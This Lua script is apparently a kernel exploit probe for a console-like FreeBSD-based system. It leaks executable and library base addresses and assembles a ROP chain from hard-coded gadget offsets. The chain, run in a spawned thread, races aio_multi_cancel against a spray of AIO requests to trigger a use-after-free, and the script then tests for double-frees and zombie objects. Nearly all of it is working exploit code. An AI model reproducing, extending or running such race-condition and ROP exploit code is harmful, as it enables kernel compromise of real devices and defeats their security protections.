-- CRASH_CLASS: HIGH
-- PROBE 541a: aio_multi_cancel(666) race — stagger + verify
--
-- 540b/540c showed aio_multi_delete(662) detects the swap (0x80020010)
-- and aborts the free. But aio_multi_cancel(666) has a different code
-- path internally. The 13.60 decode shows it also drops locks between
-- lookups. If cancel lacks the same revalidation, the cancel may
-- operate on the NEW object that reclaimed the slot → UAF.
--
-- Technique: identical to 540b stagger (single-ID cancels from ROP
-- child with NOP padding, Lua spray creates racing) but using 666
-- instead of 662. Then verify spray health like 540c.

print("=== PROBE 541a: AIO CANCEL RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

local Z = uint64(0)
local sc20 = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc455 = make_syscall(455)
local sc240 = make_syscall(240)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
local sc666 = make_syscall(666)
local sc670 = make_syscall(670)

local pid = to_num(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local pop_rdx_ret     = eb + uint64(0x3B02D7)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)
local fn_addr         = lk + uint64(0xB57)

-- ============================================================
-- AIO init + /dev/urandom
-- ============================================================
print("[A] init")
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_o, urand_fd = pcall(function()
    return make_syscall(5)(uint64(to_num(urand_path)), Z, Z)
end)
urand_fd = ok_o and to_num(urand_fd) or -1
print("  urandom=" .. urand_fd)

-- ============================================================
-- Config
-- ============================================================
local NUM_IDS = 64
local NOP_PAD = 8
local SPRAY_PER_ID = 2

-- Pre-allocate per-spray data/result buffers
local spray_data_bufs = {}
local spray_res_bufs = {}
for i = 1, NUM_IDS * SPRAY_PER_ID do
    spray_data_bufs[i] = memory.alloc(32)
    spray_res_bufs[i] = memory.alloc(16)
    for j = 0, 28, 4 do wd(spray_data_bufs[i] + j, 0xDEAD0000 + i) end
    wd(spray_res_bufs[i], 0)
end

-- AIO helpers
local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit_with_buf(fd, data_buf, res_buf)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(to_num(data_buf)))
    wq(reqs_buf + 0x18, uint64(to_num(res_buf)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(to_num(reqs_buf)), uint64(1), uint64(1), uint64(to_num(ids_out)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(ids_out) or 0)
end

local function aio_submit_one(fd)
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    return aio_submit_with_buf(fd, db, rb)
end

local function aio_poll_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc664(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)), Z)
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function aio_delete_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- Shared memory: +0x000 barrier, +0x004 done_count,
-- +0x010 per-ID cancel status (256*4), +0x410 per-ID id values (256*4)
local ok_sh, shared = pcall(function()
    return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x2000)
print("  shared=" .. q(shared))

-- ============================================================
-- Build canceller: sysarch + 20 NOPs + for each ID: cancel(666) + NOP padding
-- Key difference from 540b: syscall 666 instead of 662
-- ============================================================
local function build_canceller(count)
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc_mmap(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    -- sysarch(SET_FSBASE=129, &fake_tcb)
    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    -- 20 getpid NOPs to let Lua start spraying
    for pad = 1, 20 do
        emit(pop_rax_ret); emit(uint64(20))
        emit(pop_rdi_ret); emit(Z)
        emit(fn_addr)
    end

    -- For each ID: call 666(&id_slot, 1, &status_slot)
    -- Same ABI as 662: (ids_ptr, count, statuses_ptr)
    local shared_n = to_num(shared)
    for i = 0, count - 1 do
        local id_addr = uint64(shared_n + 0x410 + i * 4)
        local st_addr = uint64(shared_n + 0x010 + i * 4)

        emit(pop_rax_ret); emit(uint64(666))  -- aio_multi_cancel
        emit(pop_rdi_ret); emit(id_addr)
        emit(pop_rsi_ret); emit(uint64(1))
        emit(pop_rdx_ret); emit(st_addr)
        emit(fn_addr)

        -- NOP padding between cancels
        for p = 1, NOP_PAD do
            emit(pop_rax_ret); emit(uint64(20))
            emit(pop_rdi_ret); emit(Z)
            emit(fn_addr)
        end
    end

    -- Write done count
    emit(pop_rax_ret); emit(uint64(count))
    emit(pop_rdi_ret); emit(uint64(shared_n + 4))
    emit(mov_rdi_rax_ret)

    -- thr_exit
    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp, offset
end

-- ============================================================
-- [B] Race: cancel from child, spray from Lua
-- ============================================================
print("")
print(string.format("[B] Race: %d ids, spray=%dx, nop=%d, syscall=666(cancel)", NUM_IDS, SPRAY_PER_ID, NOP_PAD))

local orig_ids = {}
local ok_count = 0
for i = 1, NUM_IDS do
    local rv, id = aio_submit_one(urand_fd)
    if rv == 0 and id > 0 then
        ok_count = ok_count + 1
        orig_ids[ok_count] = id
    end
end
print(string.format("  created=%d", ok_count))

-- Write IDs to shared memory
zero(shared, 0x1000)
for i = 1, ok_count do
    wd(shared + 0x410 + (i-1) * 4, orig_ids[i])
    wd(shared + 0x010 + (i-1) * 4, 0x77777777)
end

-- Build and launch canceller
local tp, csz = build_canceller(ok_count)
print(string.format("  chain=%dB launching...", csz))

pcall(function() sc455(uint64(to_num(tp)), uint64(0x38)) end)

-- Immediately spray creates from Lua
local spray_ids = {}
local spray_count = 0
for s = 1, ok_count * SPRAY_PER_ID do
    local idx = s
    if idx <= #spray_data_bufs then
        local rv, id = aio_submit_with_buf(urand_fd, spray_data_bufs[idx], spray_res_bufs[idx])
        if rv == 0 and id > 0 then
            spray_count = spray_count + 1
            spray_ids[spray_count] = {id = id, buf_idx = idx}
        end
    end
end
print(string.format("  spray=%d", spray_count))

-- Wait for child
local ts = memory.alloc(16)
wq(ts, uint64(2)); wq(ts + 8, Z)
for w = 1, 15 do
    if (safe_rd(shared + 4) or 0) > 0 then break end
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
end
local child_done = safe_rd(shared + 4) or 0
print(string.format("  child_done=%d", child_done))

-- Analyze cancel statuses
local swap_count = 0
local status_map = {}
for i = 0, ok_count - 1 do
    local st = safe_rd(to_num(shared) + 0x010 + i * 4) or 0
    local key = string.format("0x%08X", st)
    status_map[key] = (status_map[key] or 0) + 1
    if st == 0x80020010 then
        swap_count = swap_count + 1
    end
end

print(string.format("  swaps(0x80020010)=%d/%d", swap_count, ok_count))
print("  status distribution:")
for k, v in pairs(status_map) do
    print(string.format("    %s x%d", k, v))
end

-- ============================================================
-- [C] Verify spray request health
-- ============================================================
print("")
print("[C] Verify spray requests")

-- Brief wait for AIO completions
wq(ts, uint64(1)); wq(ts + 8, Z)
pcall(function() sc240(uint64(to_num(ts)), Z) end)

local poll_ok, poll_fail, poll_weird = 0, 0, 0
local del_ok, del_fail, del_weird = 0, 0, 0
local data_ok, data_bad, data_zero = 0, 0, 0
local double_del_ok, double_del_fail = 0, 0

for i = 1, spray_count do
    local entry = spray_ids[i]
    local id = entry.id
    local buf_idx = entry.buf_idx

    -- Poll
    local p_rv, p_st = aio_poll_one(id)
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        poll_ok = poll_ok + 1
    elseif p_rv == 0 then
        poll_weird = poll_weird + 1
        if poll_weird <= 5 then
            print(string.format("  POLL WEIRD: id=0x%X st=0x%X", id, p_st))
        end
    else
        poll_fail = poll_fail + 1
        if poll_fail <= 5 then
            print(string.format("  POLL FAIL: id=0x%X rv=%d st=0x%X", id, p_rv, p_st))
        end
    end

    -- Check data buffer
    local d0 = safe_rd(spray_data_bufs[buf_idx]) or 0
    local d1 = safe_rd(spray_data_bufs[buf_idx] + 4) or 0
    if d0 == 0 and d1 == 0 then
        data_zero = data_zero + 1
    elseif d0 == (0xDEAD0000 + buf_idx) then
        data_bad = data_bad + 1
        if data_bad <= 3 then
            print(string.format("  DATA SENTINEL: buf %d still 0x%08X", buf_idx, d0))
        end
    else
        data_ok = data_ok + 1
    end

    -- Delete
    local d_rv, d_st = aio_delete_one(id)
    if d_rv == 0 and d_st == 0 then
        del_ok = del_ok + 1
    elseif d_rv == 0 and d_st == 0x80020003 then
        del_fail = del_fail + 1
        if del_fail <= 5 then
            print(string.format("  *** ALREADY DELETED: id=0x%X (freed by cancel race?) ***", id))
        end
    else
        del_weird = del_weird + 1
        if del_weird <= 5 then
            print(string.format("  DEL WEIRD: id=0x%X rv=%d st=0x%X", id, d_rv, d_st))
        end
    end

    -- Double-delete
    local dd_rv, dd_st = aio_delete_one(id)
    if dd_rv == 0 and dd_st == 0 then
        double_del_ok = double_del_ok + 1
        if double_del_ok <= 5 then
            print(string.format("  *** DOUBLE-FREE: id=0x%X deleted twice! ***", id))
        end
    else
        double_del_fail = double_del_fail + 1
    end
end

print(string.format("  poll: ok=%d fail=%d weird=%d", poll_ok, poll_fail, poll_weird))
print(string.format("  data: ok=%d sentinel=%d zero=%d", data_ok, data_bad, data_zero))
print(string.format("  delete: ok=%d already_gone=%d weird=%d", del_ok, del_fail, del_weird))
print(string.format("  double_del: free=%d refused=%d", double_del_ok, double_del_fail))

-- ============================================================
-- [D] Original IDs post-race
-- ============================================================
print("")
print("[D] Original IDs post-cancel-race")
local orig_alive, orig_gone, orig_weird = 0, 0, 0
for i = 1, ok_count do
    local p_rv, p_st = aio_poll_one(orig_ids[i])
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        orig_alive = orig_alive + 1
        if orig_alive <= 3 then
            print(string.format("  ZOMBIE: id=0x%X still alive st=0x%X", orig_ids[i], p_st))
        end
    elseif p_rv == 0 and p_st == 0x80020003 then
        orig_gone = orig_gone + 1
    else
        orig_weird = orig_weird + 1
        if orig_weird <= 3 then
            print(string.format("  ORIG WEIRD: id=0x%X rv=%d st=0x%X", orig_ids[i], p_rv, p_st))
        end
    end
end
print(string.format("  alive=%d gone=%d weird=%d", orig_alive, orig_gone, orig_weird))

-- Try deleting the zombies — cancel might have freed them unlike delete
local orig_del_ok, orig_del_refused = 0, 0
for i = 1, ok_count do
    local d_rv, d_st = aio_delete_one(orig_ids[i])
    if d_rv == 0 and d_st == 0 then
        orig_del_ok = orig_del_ok + 1
    else
        orig_del_refused = orig_del_refused + 1
    end
end
print(string.format("  delete: ok=%d refused=%d", orig_del_ok, orig_del_refused))

-- ============================================================
-- [E] Health check: fresh cycle
-- ============================================================
print("")
print("[E] Health check")
local h_rv, h_id = aio_submit_one(urand_fd)
if h_rv == 0 and h_id > 0 then
    wq(ts, uint64(0)); wq(ts + 8, uint64(100000000))
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
    local h_prv, h_pst = aio_poll_one(h_id)
    local h_drv, h_dst = aio_delete_one(h_id)
    local h_drv2, h_dst2 = aio_delete_one(h_id)
    print(string.format("  create=0x%X poll=%d/%X del=%d/%X del2=%d/%X",
        h_id, h_prv, h_pst, h_drv, h_dst, h_drv2, h_dst2))
    if h_pst == 3 and h_dst == 0 and h_dst2 == 0x80020003 then
        print("  HEALTHY")
    else
        print("  *** UNHEALTHY ***")
    end
else
    print("  CREATE FAILED rv=" .. h_rv)
end

print("")
local pid2 = to_num(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 541a DONE ===")
